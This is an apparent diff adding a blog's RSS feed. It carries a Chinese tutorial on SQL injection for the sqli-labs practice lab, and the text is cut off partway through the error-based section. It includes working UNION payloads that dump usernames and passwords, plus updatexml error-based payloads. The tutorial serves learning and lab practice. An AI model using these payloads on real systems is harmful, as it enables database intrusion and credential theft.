@@ -1,0 +1,2294 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>cOOl &#39;s blog</title>
+        <link>https://coollllllll.github.io/</link>
+        <description>Recent content on cOOl &#39;s blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <lastBuildDate>Fri, 09 Oct 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://coollllllll.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>SQL注入相关</title>
+        <link>https://coollllllll.github.io/p/sql/</link>
+        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/sql/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/sql/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post SQL注入相关" /&gt;&lt;h1 id=&#34;sql注入相关配合sqli-labs&#34;&gt;SQL注入相关(配合sqli-labs)&lt;/h1&gt;
+&lt;p&gt;基础总结+sqli-lab，lab过程偏向白盒，省略黑盒探测过程&lt;/p&gt;
+&lt;h2 id=&#34;数据库相关&#34;&gt;数据库相关&lt;/h2&gt;
+&lt;h3 id=&#34;分类&#34;&gt;分类&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;关系型数据库&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;表格存储，表和表间关系构成数据库，例如MySQL、SQLServer。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;非关系型数据库&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;有Key-Value存储数据库、列存储数据库、文档型数据库、图形存储数据库。&lt;/p&gt;
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;p&gt;键值数据库：Redis、Memcached&lt;/p&gt;
+&lt;p&gt;文档数据库：MongoDB&lt;/p&gt;
+&lt;p&gt;图形数据库：Neo4j&lt;/p&gt;
+&lt;h3 id=&#34;基础操作&#34;&gt;基础操作&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 查看数据库
+show databases;
+
+# 使用数据库
+use mysql;
+
+# 查看当前数据库
+select database();
+
+# 查看数据表
+show tables;
+
+# 查看数据库版本
+select version();
+
+# 查看当前数据库用户
+select user();
+
+# 查看数据库路径
+select @@datadir;
+
+# 查看安装路径
+select @@basedir;
+
+# 查看系统类型
+select @@version_compile_os;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;mysql元数据-information_schema&#34;&gt;MySQL元数据-information_schema&lt;/h3&gt;
+&lt;p&gt;该数据库存储MySQL 服务器所维护的所有其他数据库的信息，如数据库名，数据库的表，表的数据类型与访问权限等。&lt;/p&gt;
+&lt;p&gt;该库中有以下三个表：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;SCHEMATA&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;提供当前 MySQL 实例中所有数据库的信息。&lt;code&gt;show databases; &lt;/code&gt;的结果就是取之此表。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;TABLES&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;提供数据库中所有表的信息(包括视图)。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;COLUMNS&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;提供表中所有列信息。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;查询数据表：&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select table_name from information_schema.tables where table_schema=&#39;test&#39;;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;查询数据列：&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select column_name from information_schema.columns where table_name=&#39;table1&#39;;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;sql注入相关判断&#34;&gt;SQL注入相关判断&lt;/h2&gt;
+&lt;h3 id=&#34;种类&#34;&gt;种类&lt;/h3&gt;
+&lt;p&gt;布尔型注入&lt;/p&gt;
+&lt;p&gt;联合查询注入&lt;/p&gt;
+&lt;p&gt;报错型注入&lt;/p&gt;
+&lt;p&gt;时间型注入&lt;/p&gt;
+&lt;p&gt;堆叠注入&lt;/p&gt;
+&lt;h3 id=&#34;判断注入类型&#34;&gt;判断注入类型&lt;/h3&gt;
+&lt;p&gt;在进行手工注入前需要判断当前位置是字符型还是数字型。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;数字型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;一般可通过&lt;code&gt;and 1=1&lt;/code&gt;和&lt;code&gt;and 1=2&lt;/code&gt;判断。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;使用运算符判断：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;通过加、减、乘、除等运算，判断输入参数附近有没有引号包裹。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;字符型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;一般可通过&lt;code&gt;and &#39;1&#39;=&#39;1&lt;/code&gt;和&lt;code&gt;and &#39;1&#39;=&#39;2&lt;/code&gt;判断。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;使用类型转换特性判断：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在MySQL中当数字与字符进行比较时，字符会被转为数字进行比较。&lt;/p&gt;
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 309; 
+			flex-basis: 743px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/sql/image-20220217101211710.png&#34; data-size=&#34;353x114&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/sql/image-20220217101211710.png&#34;
+			width=&#34;353&#34;
+			height=&#34;114&#34;
+			srcset=&#34;https://coollllllll.github.io/p/sql/image-20220217101211710_hu052e808f6f4e14553bc6e925f7926413_7695_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/sql/image-20220217101211710_hu052e808f6f4e14553bc6e925f7926413_7695_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;字符串1和数字1相等；字符串1a和数字1相等；字符串b和数字0相等。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;综上&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;可根据上述方法做一个基本的判断，例如&lt;code&gt;?id=2-1&lt;/code&gt;，返回为空，表明不是数字型可能是字符型；访问&lt;code&gt;?id=1a&lt;/code&gt;，成功回显，表明是字符型。&lt;/p&gt;
+&lt;h3 id=&#34;判断数据库&#34;&gt;判断数据库&lt;/h3&gt;
+&lt;h4 id=&#34;基于报错判断&#34;&gt;基于报错判断&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;MySQL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near&amp;hellip;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;Access&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Microsoft JET Database…&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;MSSQL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Microsoft ODBC Database…&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;基于数据库标志&#34;&gt;基于数据库标志&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;MSSQL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select @@version;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;Oracle&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select banner from v$version;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;MySQL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select @@version,version(),length(user)&amp;gt;0;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;PostgreSQL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select version();
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;基于数据库名&#34;&gt;基于数据库名&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;MySQL:information_schema&lt;/li&gt;
+&lt;li&gt;Access:mysysobjects&lt;/li&gt;
+&lt;li&gt;Oracle:sys.user_tables&lt;/li&gt;
+&lt;li&gt;MSSQL:sysobjects&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;基于数据库特有函数&#34;&gt;基于数据库特有函数&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;MSSQL:@@pack_received、@@rowcount&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;MySQL:connection_id()、last_insert_id()、row_count()&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Oracle:bitand(1,1)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;PostgreSQL: select extract(doy from now())&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;MSSQL和MySQL中都可用substring，而Oracle中只能调用substr&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;hellip;&lt;/p&gt;
+&lt;h4 id=&#34;基于字符串处理方式&#34;&gt;基于字符串处理方式&lt;/h4&gt;
+&lt;p&gt;MSSQL：&lt;code&gt;&#39;a&#39;+&#39;b&#39;=&#39;ab&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;MySQL：&lt;code&gt;&#39;a&#39;+&#39;b&#39;=&#39;ab&#39;、&#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Oracle：&lt;code&gt;&#39;a&#39;+&#39;b&#39;=&#39;a&#39;||&#39;b&#39;、&#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;PostgreSQL：&lt;code&gt;&#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&amp;hellip;&lt;/p&gt;
+&lt;h4 id=&#34;基于特殊符号及注释&#34;&gt;基于特殊符号及注释&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Access:&lt;code&gt;null、%00&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;MySQL:&lt;code&gt;#、--、/**/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Oracle:&lt;code&gt;-- 、/**/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;MSSQL：&lt;code&gt;-- 、/**/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Oracle中不支持多行查询，当存在&lt;code&gt;;&lt;/code&gt;子句查询符会报错&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;union注入&#34;&gt;UNION注入&lt;/h2&gt;
+&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
+&lt;p&gt;union用于将两个或多个select查询语句结果集合并&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意点：&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;使用union，select语句必须是相同数量的列&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;常见用法&#34;&gt;常见用法&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;+UNION+SELECT+1,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users),3--+
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;// 库名
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;union select 1,group_concat(schema_name),3 from information_schema.schemata
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;union select 1,(select schema_name from information_schema.schemata limit 0,1),3
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;// 表名
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;// 列名
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and table_name=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;emails&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;// 数据
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;union select 1,group_concat(id,email_id),3 from security.emails
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;// ???待。。。
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;?id=-1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;IN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x3c62723e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))))&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;**GROUP_CONCAT **&lt;/p&gt;
+&lt;p&gt;GROUP_CONCAT(expr) ——从 expr 中&lt;strong&gt;连接所有非 NULL 的字符串&lt;/strong&gt;。如果没有非 NULL 的字符串，那么它就会返回 NULL&lt;/p&gt;
+&lt;p&gt;系统变量group_concat_max_len控制允许返回的最大字节长度，默认值为1M(&amp;gt;= MariaDB 10.2.4)或1K(&amp;lt;= MariaDB 10.2.3)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;GROUP_CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;DISTINCT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;expr&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;expr&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ORDER&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;BY&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unsigned_integer&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;col_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;expr&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                 &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ASC&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;DESC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;col_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...]]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SEPARATOR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str_val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SEPARATOR指定串联各值时使用的分隔符&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。默认分隔符为逗号&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(,)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;CONCAT&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;将多个字符串连接为一个字符串，如果当中有一个NULL，返回结果即为NULL&lt;/p&gt;
+&lt;h2 id=&#34;显错注入&#34;&gt;显错注入&lt;/h2&gt;
+&lt;h3 id=&#34;主要分类&#34;&gt;主要分类&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;BigInt 等数据类型溢出&lt;/li&gt;
+&lt;li&gt;Xpath 语法错误&lt;/li&gt;
+&lt;li&gt;count() + rand() + group by 导致主键重复&lt;/li&gt;
+&lt;li&gt;空间数据类型函数错误&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;updatexml-和-extractvalue&#34;&gt;updatexml 和 extractvalue&lt;/h3&gt;
+&lt;p&gt;MySQL版本&amp;gt;5.1添加了对XML文档修改和查询的函数&lt;strong&gt;updatexml 和 extractvalue&lt;/strong&gt;，二者报错原理类似&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;updatexml() (返回替换的XML片段) 和 extractvalue()(使用XPath表示法从XML字符串中提取值)第二个参数需要传入的是 Xpath 格式的字符串。输入不符合，将参数值返回并报错。&lt;/p&gt;
+&lt;p&gt;报错长度最大为 32 位&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;常见用法&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;显示当前数据库&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;显示所有数据库&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;schema_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;INFORMATION_SCHEMA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SCHEMATA&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;获取表名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
